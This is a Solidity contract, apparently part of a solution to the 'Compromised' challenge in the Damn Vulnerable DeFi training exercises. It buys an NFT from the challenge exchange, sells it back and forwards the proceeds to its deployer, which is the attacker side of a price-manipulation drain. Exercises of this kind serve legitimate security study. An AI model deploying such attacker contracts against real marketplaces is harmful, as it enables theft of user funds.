// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "../compromised/Exchange.sol";
import "../DamnValuableNFT.sol";

contract CompromisedAttacker is ERC721Holder {
    address private immutable exchange;
    address private immutable owner;
    uint256 private tokenId;

    constructor(address exchange_) {
        exchange = exchange_;
        owner = msg.sender;
    }

    function buyOne() external payable {
        uint256 boughtTokenId = Exchange(payable(exchange)).buyOne{
            value: msg.value
        }();

        tokenId = boughtTokenId;
    }

    function sellOne() external {
        DamnValuableNFT(Exchange(payable(exchange)).token()).approve(
            exchange,
            tokenId
        );
        Exchange(payable(exchange)).sellOne(tokenId);
    }

    receive() external payable {
        owner.call{value: msg.value}("");
    }
}
